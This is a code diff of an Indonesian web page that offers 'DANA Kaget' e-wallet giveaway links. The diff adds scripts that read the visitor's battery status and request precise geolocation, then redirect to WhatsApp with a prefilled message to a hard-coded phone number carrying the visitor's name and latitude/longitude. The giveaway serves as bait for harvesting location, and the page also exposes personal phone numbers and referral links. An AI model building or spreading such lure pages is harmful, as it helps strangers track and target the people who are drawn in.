@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sebar DANA Kaget!</title>
-    <meta name="description" content="Halaman web menampilkan info DANA Kaget lalu mengarahkan ke WhatsApp setelah jeda video dan loading.">
-    <meta name="keywords" content="dana kaget, whatsapp, langsung kirim, loading, video">
+    <meta name="description" content="Halaman web menampilkan info DANA Kaget lalu mengarahkan ke WhatsApp setelah jeda video dan loading. Menampilkan info baterai dan lokasi (jika diizinkan) dengan menyertakan nama.">
+    <meta name="keywords" content="dana kaget, whatsapp, langsung kirim, loading, video, baterai, lokasi, nama">
     <meta name="author" content="AI Assistant">
     <style>
         body {
@@ -35,6 +35,7 @@
         .redirect-info {
             font-size: 0.9em;
             color: #6c757d;
+            margin-top: 10px;
         }
 
         form {
@@ -43,13 +44,13 @@
             align-items: center;
         }
 
-        textarea {
+        input[type="text"] {
             padding: 10px;
             margin-bottom: 20px;
             border: 1px solid #ccc;
             border-radius: 5px;
             width: 100%;
-            min-height: 80px;
+            box-sizing: border-box;
         }
 
         button {
@@ -95,21 +96,27 @@
 
         .video-container {
             display: none;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         video {
             max-width: 100%;
             height: auto;
         }
+
+        .info-container {
+            margin-top: 15px;
+            font-size: 0.8em;
+            color: #6c757d;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-    <h2>DZUHUR, JANGAN LUPA SOLAT ABIS ITU MAKAN</h2>
+        <h2>DZUHUR, JANGAN LUPA SOLAT ABIS ITU MAKAN</h2>
         <form id="dana-form">
-            <label for="pesan">Kasih kata kata yg suka promosi tapi ga izin : </label>
-            <textarea id="pesan" name="pesan" required></textarea>
+            <label for="nama">Nama Kamu : </label>
+            <input type="text" id="nama" name="nama" required>
 
             <button type="submit" id="submit-btn">Kirim ke WhatsApp</button>
         </form>
@@ -125,6 +132,11 @@
             <p class="loading-text">Tunggu sebentar, narsis duku 🤣</p>
         </div>
 
+        <div class="info-container" id="info-container">
+            <p id="battery-info">Memuat info baterai...</p>
+            <p id="location-info">Memuat info lokasi...</p>
+        </div>
+
         <p class="redirect-info">nara zaen</p>
     </div>
 
@@ -135,14 +147,65 @@
         const narsisVideo = document.getElementById('narsis-video');
         const loadingContainer = document.getElementById('loading-container');
         const loadingProgress = document.getElementById('loading-progress');
-        const whatsappNumber = "+6281228727179";
-        const linkDanaKaget = "https://link.dana.id/danakaget?c=sfkkat3u5&r=cAYM8h&orderId=20250413101214242515010300166998217510000";
+        const whatsappNumber = "+6285711374861";
+        const linkDanaKaget = "https://link.dana.id/danakaget?c=sym87vrfp&r=cAYM8h&orderId=20250413101214240515010300166998217570071";
         const videoDuration = 10000; // 10 detik
         const loadingDuration = 1000; // Durasi animasi loading (bisa disesuaikan)
+        const batteryInfoElement = document.getElementById('battery-info');
+        const locationInfoElement = document.getElementById('location-info');
+        let batteryLevel = 'Tidak tersedia';
+        let isCharging = 'Tidak tersedia';
+        let latitude = 'Tidak tersedia';
+        let longitude = 'Tidak tersedia';
+
+        // Mendapatkan informasi baterai
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                updateInfoDisplay();
+
+                battery.addEventListener('levelchange', () => {
+                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    updateInfoDisplay();
+                });
+
+                battery.addEventListener('chargingchange', () => {
+                    isCharging = battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya';
+                    updateInfoDisplay();
+                });
+            }).catch(error => {
+                batteryInfoElement.textContent = 'Info baterai tidak tersedia.';
+                console.error('Gagal mendapatkan info baterai:', error);
+            });
+        } else {
+            batteryInfoElement.textContent = 'Fitur info baterai tidak didukung.';
+        }
+
+        // Mendapatkan informasi lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                latitude = position.coords.latitude.toFixed(6);
+                longitude = position.coords.longitude.toFixed(6);
+                updateInfoDisplay();
+            }, error => {
+                locationInfoElement.textContent = 'Akses lokasi ditolak atau tidak tersedia.';
+                console.error('Gagal mendapatkan lokasi:', error);
+            });
+        } else {
+            locationInfoElement.textContent = 'Fitur lokasi tidak didukung.';
+        }
+
+        function updateInfoDisplay() {
+            batteryInfoElement.textContent = `Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            locationInfoElement.textContent = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
+        }
 
         submitBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            const pesan = document.getElementById('pesan').value;
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Info Baterai: ${batteryLevel}, Status: ${isCharging}`;
+            const locationText = `Lokasi: Lat ${latitude}, Lon ${longitude}`;
 
             // Sembunyikan form dan tampilkan video
             form.style.display = 'none';
@@ -167,7 +230,7 @@
             // Setelah video selesai (atau durasi yang ditentukan), redirect ke WhatsApp
             setTimeout(() => {
                 narsisVideo.pause();
-                const whatsappMessage = `Pesan : ${pesan}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nPROMOSI MINIMAL IZIN BRO`;
+                const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nSAVE NOMER GUA ANJAY`;
                 const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
                 window.location.href = whatsappUrl;
             }, videoDuration);
@@ -176,8 +239,10 @@
         narsisVideo.addEventListener('ended', () => {
             // Jika video selesai sebelum timeout (opsional)
             clearTimeout(redirectTimeout);
-            const pesan = document.getElementById('pesan').value;
-            const whatsappMessage = `Pesan dari kamu: ${pesan}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nPROMOSI MINIMAL IZIN BRO`;
+            const nama = document.getElementById('nama').value;
+            const batteryText = `Baterai ku sisa ${batteryLevel} nara, dan ${isCharging}`;
+            const locationText = `Lokasi ku mungkin disini ${latitude}, ${longitude} 🤣`;
+            const whatsappMessage = `Nama: ${nama}\n${batteryText}\n${locationText}\n\nYuk, sikat DANA Kaget! ${linkDanaKaget}\n\nPROMOSI MINIMAL IZIN BRO`;
             const whatsappUrl = `https://wa.me/${whatsappNumber.replace(/[^0-9]/g, '')}?text=${encodeURIComponent(whatsappMessage)}`;
             window.location.href = whatsappUrl;
         });
